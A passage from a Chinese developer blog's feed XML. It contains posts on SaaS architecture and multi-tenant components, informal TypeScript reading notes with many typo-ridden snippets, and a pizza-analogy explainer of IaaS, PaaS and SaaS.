href="#SaaS的核心组件" class="headerlink" title="SaaS的核心组件"></a>SaaS的核心组件</h1><h2 id="安全组件（保护用户数据）"><a href="#安全组件（保护用户数据）" class="headerlink" title="安全组件（保护用户数据）"></a>安全组件（保护用户数据）</h2><h2 id="数据隔离组件"><a href="#数据隔离组件" class="headerlink" title="数据隔离组件"></a>数据隔离组件</h2><h2 id="可配置组件"><a href="#可配置组件" class="headerlink" title="可配置组件"></a>可配置组件</h2><h2 id="可扩展组件"><a href="#可扩展组件" class="headerlink" title="可扩展组件"></a>可扩展组件</h2><h2 id="0停机时间升级维护产品"><a href="#0停机时间升级维护产品" class="headerlink" title="0停机时间升级维护产品"></a>0停机时间升级维护产品</h2><h2 id="多租户组件"><a href="#多租户组件" class="headerlink" title="多租户组件"></a>多租户组件</h2><h1 id="SaaS多租户下的数据模型分析"><a href="#SaaS多租户下的数据模型分析" class="headerlink" title="SaaS多租户下的数据模型分析"></a>SaaS多租户下的数据模型分析</h1><h2 id="数据存储架构"><a href="#数据存储架构" class="headerlink" title="数据存储架构"></a>数据存储架构</h2><p>现有的多租户用户数据存储主要分为三种方式：</p><ul><li>独立数据库</li><li>共享数据库但隔离数据</li><li>共享数据库且共享数据</li></ul><h2 id="总体业务架构"><a href="#总体业务架构" class="headerlink" title="总体业务架构"></a>总体业务架构</h2><p>SaaS平台的用户管理系统主要是统一管理用户信息，用户通过SaaS平台统一注册、登录后，能够试用、采购各企业应用，实现各个第三方企业应用的集成</p><p>从功能结构上大致可以分成4个业务域：租户域、租户管理域、用户域、用户权限域等；</p><ul><li>租户域：主要描述租户的基本信息，以及租户的组织结构、租户的用户成员（成员职位）等信息；</li><li>租户管理域：主要描述租户多级管理员详情，以及管理员对应管理的企业应用权限、数据范围权限；</li><li>用户域：主要描述用户基本信息，用户登录账号、实名认证、登录的第三方账号绑定等信息；</li><li>用户权限域：主要描述用户能够使用的企业应用以及数据范围的权限信息；</li></ul><p><img src="https://img-blog.csdn.net/20180622144116115?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hvdF9zdW1tZXJ5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="多租户模型图"><br><img src="https://img-blog.csdnimg.cn/20200404205531179.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0hvdGljZTg4OA==,size_16,color_FFFFFF,t_70" alt="分析介绍"></p><h1 id="成熟SaaS产品的4个标志"><a href="#成熟SaaS产品的4个标志" class="headerlink" title="成熟SaaS产品的4个标志"></a>成熟SaaS产品的4个标志</h1><p>成熟可用是企业选择SaaS产品的最重要标准，这也是为什么我们行业为什么要坚持潜行相当长时间的原因。企业境况说是靠时间熬出来的，更准确地说是靠产品的成熟化熬出来的。成熟的SaaS果实一如褚橙般甜蜜。</p><p>那么如何判断一个产品是已经成熟的？</p><h2 id="稳定的商业模式，组分市场和顾客分层"><a href="#稳定的商业模式，组分市场和顾客分层" class="headerlink" title="稳定的商业模式，组分市场和顾客分层"></a>稳定的商业模式，组分市场和顾客分层</h2><p>当一个商业模式和对应的价格水平能够稳定一到两年，感觉已经没有大幅修订的必要时，SaaS产品在商业模式上才算稳定下来，它是对产品成熟度的第一大贡献。</p><h2 id="产品投射了专业和行业的最佳实践"><a href="#产品投射了专业和行业的最佳实践" class="headerlink" title="产品投射了专业和行业的最佳实践"></a>产品投射了专业和行业的最佳实践</h2><p>一个成熟的CRM应用必然需要将销售管理方法、流程和工具内置在产品中，它不仅需要提供一个程序，还需要提供一个使用程序的程序。</p><h2 id="健全的用户入场协助"><a href="#健全的用户入场协助" class="headerlink" title="健全的用户入场协助"></a>健全的用户入场协助</h2><p>为了做到这一点，SaaS产品需要首先拥有完善的团队账户架构，能够支持每个个体用户使用实名账户，被初始管理员授予合适的权限，如果有多个团队，还可能需要团队管理员这个角色来减轻大管家的压力。为了加入新成员，调整成员和分组的过程必须足够清晰和简单，让客户有动力来维持这个用户系统。相反，如果我们在这个问题上忽视，胡乱地分配一些001，002工号出去，甚至允许用户合用账号，那客户总是会走到混乱失序的那一天，距离客户流失也就不远了。</p><p>仅仅有了科学完善的账户结构体系还不够，我们还要帮助企业穿针引线，让多成员进入这个系统非常简单和轻松。比如一个BI应用，在配置外部数据源的时候，需要用户添加Google Analytics的Profile，问题是掌握这个信息的人可能不是管理员本人，他可能需要同事的帮忙才能完成这个配置，这时候软件可能需要直接将邀请成员完成一个配置作为一个用例来对待，设计出专门的交互界面。</p><p>有一次在机场顿悟，昂贵的机场设施和几乎所有的机场地勤人员其实只为一个事情，让乘客登上飞机。而我们去机场，其实是为了坐飞机旅行，我们不一定意识到onboarding的过程这么重要和昂贵。</p><p>当一个SaaS产品意识到这一点，把帮助用户上船，上飞机作为一个大型项目来看待，它距离成熟就不远了。</p><h2 id="支持外部数据整合的开放性"><a href="#支持外部数据整合的开放性" class="headerlink" title="支持外部数据整合的开放性"></a>支持外部数据整合的开放性</h2><p>最后一点，成熟的SaaS产品必然考虑开放性，如果没有API，几乎就不可能成为一个长期存在的SaaS产品</p><p>一个标准化的SaaS软件可能增强到特性丰富，组织有序的良好状态，但是它绝无可能提供用户所要的所有功能，企业用户结合使用多个产品工具解决业务问题是一个常态。有了丰富的编程接口，至少让用户有机会能够通过变通的办法来实现他之所想。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SaaS的收费模式&quot;&gt;&lt;a href=&quot;#SaaS的收费模式&quot; class=&quot;headerlink&quot; title=&quot;SaaS的收费模式&quot;&gt;&lt;/a&gt;SaaS的收费模式&lt;/h1&gt;&lt;p&gt;首年收取的是开户费(软件系统费和账号费等)，从第二年开始收取年费，Sass要提供持续
      
    
    </summary>
    
      <category term="杂文" scheme="https://zhanghao-web.github.io/categories/%E6%9D%82%E6%96%87/"/>
    
    
      <category term="杂文" scheme="https://zhanghao-web.github.io/tags/%E6%9D%82%E6%96%87/"/>
    
  </entry>
  
  <entry>
    <title>&lt;深入理解TypeScript读书笔记&gt;（一）</title>
    <link href="https://zhanghao-web.github.io/2020/04/19/Ts/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TypeScript%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://zhanghao-web.github.io/2020/04/19/Ts/深入理解TypeScript读书笔记（二）/</id>
    <published>2020-04-19T08:18:50.000Z</published>
    <updated>2020-04-19T08:18:52.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TypeScript类型系统"><a href="#TypeScript类型系统" class="headerlink" title="TypeScript类型系统"></a>TypeScript类型系统</h1><h2 id="types"><a href="#types" class="headerlink" title="@types"></a>@types</h2><h3 id="全局-types"><a href="#全局-types" class="headerlink" title="全局@types"></a>全局@types</h3><p>@types 支持全局和模块类型定义</p><pre><code class="js">npm install @type/jquery --save-dev</code></pre><p>默认情况下，TypeScript 会自动包含支持全局使用的任何声明定义</p><h3 id="局部-types"><a href="#局部-types" class="headerlink" title="局部@types"></a>局部@types</h3><p>安装完成后不需要做特别配置，只要想使用模块一样使用它一样</p><pre><code class="js">import * as $ from &#39;jquery&#39;</code></pre><p>可以在<code>typeconfig.json</code>中可以配置有意义的类型</p><pre><code class="js">{    compilerOptions{        &quot;type&quot; :[            &quot;jquery&quot;        ]    }}</code></pre><h2 id="声明文件"><a href="#声明文件" class="headerlink" title="声明文件"></a>声明文件</h2><p>可以使用<code>declear</code>关键字来告诉typescript，你试图表诉一个其他地方已经存在的代码</p><pre><code class="ts">foo = 123declear var foo:anyfoo = 123</code></pre><p>在实际项目可以新建一个<code>global.d.ts</code>文件来把这些声明放到里面</p><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p>接口运行时的影响为0.有多种方式可以声明变量的结构</p><pre><code class="js">//等效声明//内联注解declear const myPoint = {x:number,y:number}//接口实现  interface myPoint{    x: number,    y: number}</code></pre><h3 id="类来实现接口"><a href="#类来实现接口" class="headerlink" title="类来实现接口"></a>类来实现接口</h3><pre><code class="js">interface myPoint{    x: string,    y: string}class point implements myPoint{    x: string,    y: string}</code></pre><p><strong>注意：并非每个接口都容易实现</strong></p><pre><code class="js">interface Crazy{    new() {        value: number    }}class CrazyClass implements Crazy{    constructor(){        return {            value: 123        }    }}const crazy = new CrazyClass()</code></pre><h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p>枚举是收集有关连变量的一种方式, 作用就是管理常量，让常量更规范统一</p><h3 id="数字枚举"><a href="#数字枚举" class="headerlink" title="数字枚举"></a>数字枚举</h3><pre><code class="js">enum CradSuit{    Clubs,    Diamonds,    Hearts,    Spades}let clubs = CradSuot.Clubs</code></pre><h3 id="字符串枚举"><a href="#字符串枚举" class="headerlink" title="字符串枚举"></a>字符串枚举</h3><pre><code class="js">enum CradSuit{    Clubs,    Diamonds,    Hearts,    Spades}console.log(CardSuit.Clubs[0]) // &#39;Clubs&#39;console.log(CardSuit.[&#39;Diamonds&#39;]) // 0</code></pre><p>改变与枚举关联的数字</p><pre><code class="js">enum CradSuit{    Clubs , // 0    Diamonds, // 1    Hearts, // 2    Spades // 3}enum CradSuit{    Clubs  = 3, // 3    Diamonds, // 4    Hearts, // 5    Spades // 6</code></pre><h3 id="常量枚举"><a href="#常量枚举" class="headerlink" title="常量枚举"></a>常量枚举</h3><pre><code class="js">enum Fruit {    Apple,    banner,    orange}console.log(Fruit.orange) // 2</code></pre><h4 id="静态方法的枚举"><a href="#静态方法的枚举" class="headerlink" title="静态方法的枚举"></a>静态方法的枚举</h4><pre><code class="js">enum Weekday{    Monday,    Tuesday,    Wednesday,    Thursday,    Friday,    Saturday    Sunday}namesapce Weekday{    export function isBusinessDay(weekday: Weekday){        switch(weekday){            case Weekday.Saturday:        case Weekday.Sunday:            return false;        default:            return true;        }    }}const mon = Weekday.Monday;const sun = Weekday.Sunday;console.log(Weekday.isBusinessDay(mon)); // trueconsole.log(Weekday.isBusinessDay(sun));</code></pre><h2 id="lib-d-ts"><a href="#lib-d-ts" class="headerlink" title="lib.d.ts"></a>lib.d.ts</h2><p>安装typescript的时候会有附带一个<code>lib.d.ts</code>的文件，里面的内容定义了(window,document,math，data,string)的变量声明</p><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>可组合系统的核心构建块</p><h3 id="返回函数类型注解"><a href="#返回函数类型注解" class="headerlink" title="返回函数类型注解"></a>返回函数类型注解</h3><pre><code class="js">interface Foo {    foo: string}function foo(sameple: foo) :foo{    console.log(foo)}</code></pre><h3 id="可选参数及默认参数值属性"><a href="#可选参数及默认参数值属性" class="headerlink" title="可选参数及默认参数值属性"></a>可选参数及默认参数值属性</h3><pre><code class="js">function person(speak:string =&quot;hello world&quot;,age?:number){    console.log(speak,age)}person(&#39;你好&#39;)person(...12)</code></pre><h3 id="函数重载"><a href="#函数重载" class="headerlink" title="函数重载"></a>函数重载</h3><pre><code class="js">function addOne(a:number,y?:number,z?:number,x?:number){    if(x === undefined &amp;&amp; y === undefined &amp;&amp; z === undefined){        x = y = z = a    }else if( y === undefined &amp;&amp; z === undefined ){        z = a         x = y    }    return {        top: a,        left: x,        right: y,        bottom: z    }}addOne(1)addOne(1,1,1,1)</code></pre><h3 id="函数声明"><a href="#函数声明" class="headerlink" title="函数声明"></a>函数声明</h3><pre><code class="js">type londHand = {    (a:number) : number}type ShortHand = (a:number) =&gt;{number}</code></pre><h2 id="可调用的"><a href="#可调用的" class="headerlink" title="可调用的"></a>可调用的</h2><pre><code class="js">interface Complex {    (foo:string,age?:number,...other,boolean[]):number}</code></pre><h2 id="类型断言"><a href="#类型断言" class="headerlink" title="类型断言"></a>类型断言</h2><p>TypeScript 允许你覆盖它的推断，并且能以你任何你想要的方式分析它，这种机制被称为「类型断言」</p><p><code>as foo 与 &lt;foo&gt;</code></p><p><code>&lt;foo&gt;</code>可能会与jsx中冲突，推荐使用<code>as foo</code></p><h3 id="双重断言"><a href="#双重断言" class="headerlink" title="双重断言"></a>双重断言</h3><pre><code class="js">function handle(event:Event){    console.log(element = (event as any) as HTMLElement)}</code></pre><h2 id="Freshness"><a href="#Freshness" class="headerlink" title="Freshness"></a>Freshness</h2><p>为了能让检查对象字面量类型更容易，提供Freshness更严格的类型检查</p><h2 id="类型保护"><a href="#类型保护" class="headerlink" title="类型保护"></a>类型保护</h2><p>你可以使用更小范围的对象类型</p><p><code>typeof</code> <code>instanceof</code></p><h2 id="字面量类型"><a href="#字面量类型" class="headerlink" title="字面量类型"></a>字面量类型</h2><p>你可以使用一个准备的类型来定义一个对象</p><h2 id="readOnly"><a href="#readOnly" class="headerlink" title="readOnly"></a>readOnly</h2><p>如字面意思一样，是只读的，不能随便更改的，是一种更安全的方式</p><pre><code class="js">type Foo = {  readonly bar: number;  readonly bas: number;};// 初始化const foo: Foo = { bar: 123, bas: 456 };// 不能被改变foo.bar = 456; // Error: foo.bar 为仅读属性</code></pre><h3 id="与const不同"><a href="#与const不同" class="headerlink" title="与const不同"></a>与const不同</h3><ul><li>const 用于变量，变量不能重新赋给其他任何事物</li><li>readOnly 用于属性，用于别名可以修改属性</li></ul><h2 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h2><p>他的用途就是在你不确定要穿的值的属性时，那么就可以使用泛型去确定<br>在成员之间提供有意义的约束，这些成员可以是：</p><ul><li>类的实例成员</li><li>类的方法</li><li>函数参数</li><li>函数返回值</li></ul><pre><code class="js">class Queue&lt;T&gt;{    private data: T[] = []    push = (item:&lt;T&gt;) =&gt; {this.data.push(item)}    pop = ():T | undefiend =&gt; {this.data.shift()}}const queue = new Queue&lt;number&gt;()queue.push(1)queue.shift(&#39;1&#39;) //  error &#39;1&#39; is string</code></pre><p>你可以随意调用泛型参数，当你使用简单的泛型时，泛型常用 T、U、V 表示</p><h2 id="类型推断"><a href="#类型推断" class="headerlink" title="类型推断"></a>类型推断</h2><p>TypeScript 能根据一些简单的规则推断（检查）变量的类型，你可以通过实践，很快的了解它们。</p><p>定义变量，函数返回类型，赋值，解构，结构化等都可以推断出类型</p><h2 id="类型兼容性"><a href="#类型兼容性" class="headerlink" title="类型兼容性"></a>类型兼容性</h2><p>用于确定一个类型是否能赋值给其他类型</p><p>协变<br>逆变，<br>双向协变，<br>不变</p><h2 id="never"><a href="#never" class="headerlink" title="never"></a>never</h2><p><code>never</code> 类型是 TypeScript 中的底层类型。它自然被分配的一些例子：</p><p>一个从来不会有返回值的函数（如：如果函数内含有 <code>while(true) {}</code>）；<br>一个总是会抛出错误的函数（如：<code>function foo() { throw new Error(&#39;Not Implemented&#39;)</code> }，foo 的返回类型是 never）；</p><p>但是，never 类型仅能被赋值给另外一个 never</p><h3 id="用例：详细的检查"><a href="#用例：详细的检查" class="headerlink" title="用例：详细的检查"></a>用例：详细的检查</h3><pre><code class="js">function foo(x:string | number):boolean {    if (typeof x === &#39;string&#39;) {        return true;    } else if (typeof x === &#39;number&#39;) {        return false;    }    // 如果不是一个 never 类型，这会报错：    // - 不是所有条件都有返回值 （严格模式下）    // - 或者检查到无法访问的代码    // 但是由于 TypeScript 理解 `fail` 函数返回为 `never` 类型    // 它可以让你调用它，因为你可能会在运行时用它来做安全或者详细的检查。    return fail(&#39;Unexhaustive&#39;);} function fail(message: string): never {  throw new Error(message);}</code></pre><h3 id="never与void的区别"><a href="#never与void的区别" class="headerlink" title="never与void的区别"></a>never与void的区别</h3><p>void 表示没有任何类型，never 表示永远不存在的值的类型。</p><h2 id="辨析联合类型"><a href="#辨析联合类型" class="headerlink" title="辨析联合类型"></a>辨析联合类型</h2><p>当类中含有字面量成员时，我们可以用该类的属性来辨析联合类型。</p><pre><code class="js">interface Square {  kind: &#39;square&#39;;  size: number;}interface Rectangle {  kind: &#39;rectangle&#39;;  width: number;  height: number;}type Shape = Square | Rectangle;</code></pre><h2 id="流动的类型"><a href="#流动的类型" class="headerlink" title="流动的类型"></a>流动的类型</h2><p>TypeScript 类型系统非常强大，它支持其他任何单一语言无法实现的类型流动和类型片段。<br>关键的动机：当你改变了其中一个时，其他相关的会自动更新，并且当有事情变糟糕时，你会得到一个友好的提示，就好像一个被精心设计过的约束系统。</p><h3 id="复制类型和值"><a href="#复制类型和值" class="headerlink" title="复制类型和值"></a>复制类型和值</h3><p>如果你想移动一个类，你可能会想要做以下事情：</p><pre><code class="js">class Foo {}const Bar = Foo;let bar: Bar; // Error: 不能找到名称 &#39;Bar&#39;//这会得到一个错误，因为 const 仅仅是复制了 Foo 到一个变量声明空间，因此你无法把 Bar 当作一个类型声明使用。正确的方式是使用 import 关键字，请注意，如果你在使用 namespace 或者 modules，使用 import 是你唯一能用的方式：namespace importing {  export class Foo {}}import Bar = importing.Foo;let bar: Bar; // ok//这个 import 技巧，仅适合于类型和变量。</code></pre><h3 id="捕获变量的类型"><a href="#捕获变量的类型" class="headerlink" title="捕获变量的类型"></a>捕获变量的类型</h3><p>你可以通过 typeof 操作符在类型注解中使用变量    </p><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><p>JavaScript 有一个 Error 类，用于处理异常。你可以通过 throw 关键字来抛出一个错误。然后通过 try/catch 块来捕获此错误：</p><pre><code class="js">try{    throw new Error(&#39;Something bad happened&#39;);}catch(e){    console.log(e)}</code></pre><p>除内置的 Error 类外，还有一些额外的内置错误，它们继承自 Error 类：<code>RangeError,ReferenceError,SyntaxError,TypeError,URIError</code></p><h2 id="混合"><a href="#混合" class="headerlink" title="混合"></a>混合</h2><p>TypeScript (和 JavaScript) 类只能严格的单继承，因此你不能做：</p><pre><code class="js">class User extends Tagged, Timestamped { // ERROR : 不能多重继承  // ..}</code></pre><p>从可重用组件构建类的另一种方式是通过基类来构建它们，这种方式称为混合。</p><h2 id="常见的typescript错误"><a href="#常见的typescript错误" class="headerlink" title="常见的typescript错误"></a>常见的typescript错误</h2><p><a href="https://jkchao.github.io/typescript-book-chinese/error/common.html#ts2304" target="_blank" rel="noopener">常见的typescript错误</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;TypeScript类型系统&quot;&gt;&lt;a href=&quot;#TypeScript类型系统&quot; class=&quot;headerlink&quot; title=&quot;TypeScript类型系统&quot;&gt;&lt;/a&gt;TypeScript类型系统&lt;/h1&gt;&lt;h2 id=&quot;types&quot;&gt;&lt;a href=&quot;#
      
    
    </summary>
    
      <category term="Js" scheme="https://zhanghao-web.github.io/categories/Js/"/>
    
    
      <category term="Ts" scheme="https://zhanghao-web.github.io/tags/Ts/"/>
    
  </entry>
  
  <entry>
    <title>什么是laaS,PaaS,SaaS?</title>
    <link href="https://zhanghao-web.github.io/2020/04/16/%E6%9C%8D%E5%8A%A1/%E4%BB%80%E4%B9%88%E6%98%AFlaaS-PaaS-SaaS/"/>
    <id>https://zhanghao-web.github.io/2020/04/16/服务/什么是laaS-PaaS-SaaS/</id>
    <published>2020-04-16T01:54:46.000Z</published>
    <updated>2020-04-16T14:19:40.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>首先云服务器可以分为</p><ul><li>IaaS：基础设施即服务，<code>Infrastructure-as-a-service</code></li><li>PaaS：平台即服务，<code>Platform-as-a-service</code></li><li>SaaS：软件即服务，<code>Software-as-a-service</code></li><li>数据即服务：如阿里云对象存储，七牛云存储等</li><li>其他软件服务：机器学习、人工智能等</li></ul></blockquote><p>公司要开发一个<code>SaaS云服务器</code>的软件，借此来加深下lasS,PaaS,SaaS的概念及区别</p><h2 id="比喻lasS-PaaS-SaaS"><a href="#比喻lasS-PaaS-SaaS" class="headerlink" title="比喻lasS,PaaS,SaaS"></a>比喻lasS,PaaS,SaaS</h2><p><a href="http://www.ruanyifeng.com/blog/2017/07/iaas-paas-saas.html" target="_blank" rel="noopener">比喻来自阮一峰的网站</a></p><p>请设想你是一个餐饮业者，打算做披萨生意。</p><p>你可以从头到尾，自己生产披萨，但是这样比较麻烦，需要准备的东西多，因此你决定外包一部分工作，采用他人的服务。你有三个方案。</p><p>（1）方案一：IaaS</p><p>他人提供厨房、炉子、煤气，你使用这些基础设施，来烤你的披萨。</p><p>（2）方案二：PaaS</p><p>除了基础设施，他人还提供披萨饼皮。<br>你只要把自己的配料洒在饼皮上，让他帮你烤出来就行了。也就是说，你要做的就是设计披萨的味道（海鲜披萨或者鸡肉披萨），他人提供平台服务，让你把自己的设计实现。</p><p>（3）方案三：SaaS</p><p>他人直接做好了披萨，不用你的介入，到手的就是一个成品。你要做的就是把它卖出去，最多再包装一下，印上你自己的 Logo。</p><p><img src="http://www.ruanyifeng.com/blogimg/asset/2017/bg2017072306.png" alt="披萨"></p><p>从左到右，自己承担的工作量（上图蓝色部分）越来越少，IaaS &gt; PaaS &gt; SaaS。</p><p>对应软件开发，则是下面这张图。</p><p><img src="http://www.ruanyifeng.com/blogimg/asset/2017/bg2017072307.jpg" alt="开发流程"></p><p>SaaS 是软件的开发、管理、部署都交给第三方，不需要关心技术问题，可以拿来即用。普通用户接触到的互联网服务，几乎都是 SaaS，下面是一些例子。</p><blockquote><ul><li>客户管理服务 Salesforce</li><li>团队协同服务 Google Apps</li><li>储存服务 Box</li><li>储存服务 Dropbox</li><li>社交服务 Facebook / Twitter / Instagram</li></ul></blockquote><p>PaaS 提供软件部署平台（runtime），抽象掉了硬件和操作系统细节，可以无缝地扩展（scaling）。开发者只需要关注自己的业务逻辑，不需要关注底层。下面这些都属于 PaaS。</p><blockquote><ul><li>Heroku</li><li>Google App Engine</li><li>OpenShift</li></ul></blockquote><p>IaaS 是云服务的最底层，主要提供一些基础资源。它与 PaaS 的区别是，用户需要自己控制底层，实现基础设施的使用逻辑。下面这些都属于 IaaS。</p><blockquote><ul><li>Amazon EC2</li><li>Digital Ocean</li><li>RackSpace Cloud</li></ul></blockquote><h2 id="SaaS详细介绍"><a href="#SaaS详细介绍" class="headerlink" title="SaaS详细介绍"></a>SaaS详细介绍</h2><p>我们将着重介绍SaaS架构设计,并围绕WHAT（是什么？）、WHY（为什么？）、WHERE（在哪里？）和HOW（怎么样？）这四个问题</p><h3 id="什么是SaaS？"><a href="#什么是SaaS？" class="headerlink" title="什么是SaaS？"></a>什么是SaaS？</h3><p><img src="https://user-gold-cdn.xitu.io/2019/6/3/16b1a96e7d4e0ce5?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="SaaS"></p><p>从宏观的角度来看，SaaS是一种软件应用程序交付方式，软件提供商集中化托管一个或多个软件应用程序，并通过互联网向租户体用这些软件应用程序;从分类上讲SaaS也是云计算的一部分</p><p>SaaS应用程序的任何更新或者修复漏洞操作都是由软件提供商负责实施和处理的，由于租户是通过互联网获取软件服务，所以租户端无需下载任何的升级包或者修复补丁，是一种开箱即获取最新软件产品的服务方式。</p><h3 id="为什么选择SaaS？"><a href="#为什么选择SaaS？" class="headerlink" title="为什么选择SaaS？"></a>为什么选择SaaS？</h3><h4 id="1-消费者角度"><a href="#1-消费者角度" class="headerlink" title="1.消费者角度"></a>1.消费者角度</h4><p>获取软件服务的方式足够简单，SaaS也许是迄今为止使用软件最简单的方式之一，租户只需要动动鼠标和键盘，即可在几小时甚至几分钟内获得一个大型的软件服务。相比于传统使用软件的方式，租户省去了研发、部署、运维等一系列繁复的过程，且获得软件的时间和费用成本都大幅度降低</p><h4 id="2-商业角度"><a href="#2-商业角度" class="headerlink" title="2.商业角度"></a>2.商业角度</h4><p>SaaS可以体用跨地域、跨平台的软件服务。与此同时，软件服务商可以统一对软件进行版本管理，这将带来以下几点好处（包括但不限于）：</p><p>1、缩短产品上线时间：多端适配，统一版本，统一更新<br>2、降低维护成本：不需要同时维护多个版本的软件实例，运维压力减小<br>3、容易升级：由于版本得到有效控制，一次升级，即可覆盖所有租户端</p><h3 id="SaaS的特性及优势是什么"><a href="#SaaS的特性及优势是什么" class="headerlink" title="SaaS的特性及优势是什么?"></a>SaaS的特性及优势是什么?</h3><p>1.简单<br>2.经济实惠<br>3.安全<br>4.兼任性</p><h3 id="SaaS软件的适用范围"><a href="#SaaS软件的适用范围" class="headerlink" title="SaaS软件的适用范围"></a>SaaS软件的适用范围</h3><p>从理论上讲，SaaS可以将任何的软件SaaS，下面列举一些通用的分类供大家参考：</p><p>1、Office在线办公类SaaS产品<br>2、电子邮件和即时消息类SaaS产品<br>3、社交媒体类SaaS产品<br>4、第三方API类SaaS产品<br>5、安全和访问控制类SaaS产品<br>6、机器学习类SaaS产品<br>7、人工智能类SaaS产品<br>8、地理位置服务类SaaS产品<br>9、数据流和数据检索类SaaS产品</p><h3 id="SaaS产品的缺陷"><a href="#SaaS产品的缺陷" class="headerlink" title="SaaS产品的缺陷"></a>SaaS产品的缺陷</h3><h4 id="1-软件控制权"><a href="#1-软件控制权" class="headerlink" title="1.软件控制权"></a>1.软件控制权</h4><p>与企业内部部署的软件不同，由于SaaS软件被击中托管在服务提供商的Web服务器中，所以租户无法控制所有的软件应用程序，SaaS化的软件比企业自行部署的软件获得的控制权更少，租户可操作的自定义控制权极度有限。</p><h4 id="2-消费者基数小"><a href="#2-消费者基数小" class="headerlink" title="2.消费者基数小"></a>2.消费者基数小</h4><p>由于SaaS软件是将一套应用程序共享给一个或者多个租户共同使用，这种共享的消费方式还未被大多数的消费者所接受。同时，受制于市场环境的影响，目前还有大多数的软件还未SaaS化</p><h4 id="3-性能瓶颈"><a href="#3-性能瓶颈" class="headerlink" title="3.性能瓶颈"></a>3.性能瓶颈</h4><p>共享应用程序必然会带来服务器性能的下降、如计算速度、网络资源、I/O读写等都将面临严峻的考验。在性能方面，企业内部部署的“独享模式”的应用程序比SaaS软件的“共享模式”略胜一筹。</p><h4 id="4-安全问题"><a href="#4-安全问题" class="headerlink" title="4.安全问题"></a>4.安全问题</h4><p>当租户在选择一款SaaS产品时，产品的安全性将会被放置在第一位进行考虑。如数据的隔离、敏感数据的加密、数据访问权限控制、个人隐私等问题。</p><h3 id="SaaS产品的核心组件"><a href="#SaaS产品的核心组件" class="headerlink" title="SaaS产品的核心组件"></a>SaaS产品的核心组件</h3><p>不同类型的SaaS产品，由于要面对不同的用户愿景，可能在功能和业务上会有所不同，但任何一个SaaS产品，都具备以下几个共同的核心组件。</p><p><img src="https://user-gold-cdn.xitu.io/2019/6/3/16b1a96e7628ebeb?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="核心组件"></p><h4 id="安全组件"><a href="#安全组件" class="headerlink" title="安全组件"></a>安全组件</h4><p>在SaaS产品中，系统安全永远是第一位需要考虑的事情，如何保障租户数据的安全，是你首要的事情。这如同银行首选需要保障储户资金安全一样。安全组件就是统一的对SaaS产品进行安全防护，保障系统数据安全。</p><h4 id="数据隔离组件"><a href="#数据隔离组件" class="headerlink" title="数据隔离组件"></a>数据隔离组件</h4><p>安全组件解决了用户数据安全可靠的问题，但数据往往还需要解决隐私问题，各企业之间的数据必须相互不可见，即相互隔离。在SaaS产品中，如何识别、区分、隔离个租户的数据时你在实施SaaS软件架构设计时需要考虑的第二个问题。</p><h4 id="可配置组件"><a href="#可配置组件" class="headerlink" title="可配置组件"></a>可配置组件</h4><p>尽管SaaS产品在设计之初就考虑了大多数通用的功能，让租户开箱即用，但任然有为数不少的租户需要定制服务自身业务需求的配置项，如UI布局、主题、标识（Logo）等信息。正因为无法抽象出一个完全通用的应用程序，所以在SaaS产品中，你需要提供一个可用于自定义配置的组件。</p><h4 id="可扩展组件"><a href="#可扩展组件" class="headerlink" title="可扩展组件"></a>可扩展组件</h4><p>随着SaaS产品业务和租户数量的增长，原有的服务器配置将无法继续满足新的需求，系统性能将会与业务量和用户量成反比。此时，SaaS产品应该具备水平扩展的能力。如通过网络负载均衡其和容器技术，在多个服务器上部署多个软件运行示例并提供相同的软件服务，以此实现水平扩展SaaS产品的整体服务性能。为了实现可扩展能力，就需要SaaS展示层的代码与业务逻辑部分的代码进行分离，两者独立部署。例如<strong>使用VUE+微服务构建前后端分离且可水平进行扩展的分布式SaaS应用产品</strong>。对于可扩展，还有另外一种方式，即<strong>垂直扩展</strong>，其做法比较简单，也比较粗暴：通过增加单台服务器的配置，如购买性能更好的CUP、存储更大的内存条、增大带宽等措施，让服务器能够处理更多的用户请求。但此做法对于提升产品性能没有质的改变，且成本很高。</p><h4 id="0停机时间升级产品"><a href="#0停机时间升级产品" class="headerlink" title="0停机时间升级产品"></a>0停机时间升级产品</h4><p>以往的软件在升级或者修复Bug时，都需要将运行的程序脱机一段时间，等待升级或修复工作完成后，再重新启动应用程序。而SaaS产品则需要全天候保障服务的可用性。这就需要你考虑如何实现在不重启原有应用程序的情况下，完成应用程序的升级修复工作。</p><h4 id="多租户组件"><a href="#多租户组件" class="headerlink" title="多租户组件"></a>多租户组件</h4><p>要将原有产品SaaS化，就必须提供多租户组件，多租户组件是衡量一个应用程序是否具备SaaS服务能力的重要指标之一。SaaS产品需要同时容纳多个租户的数据，同时还需要保证各租户之间的数据不会相互干扰，保证租户中的用户能够按期望索引到正确的数据，多租户组件是你必须要解决的一个问题。其余的组件都将围绕此组件展开各自的业务。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;首先云服务器可以分为&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;IaaS：基础设施即服务，&lt;code&gt;Infrastructure
      
    
    </summary>
    
      <category term="Serve" scheme="https://zhanghao-web.github.io/categories/Serve/"/>
    
    
